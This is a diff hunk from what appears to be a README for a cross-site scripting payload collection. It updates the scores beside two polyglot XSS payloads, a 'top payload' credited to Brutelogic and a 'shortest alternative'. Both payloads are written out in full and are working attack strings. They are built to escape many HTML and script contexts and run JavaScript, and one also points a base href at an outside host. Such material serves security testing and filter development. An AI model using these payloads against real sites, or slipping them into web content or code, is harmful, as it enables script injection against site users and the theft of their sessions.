@@ -144,12 +144,12 @@ For questions or support, please open an issue or contact the maintainer.
 
 ## Top payload
 
-From Brutelogic - 110/115
+From Brutelogic - 105/110
 ```js
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
 ```
 
-Shortest alternative - 108/115
+Shortest alternative - 105/115
 ```js
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
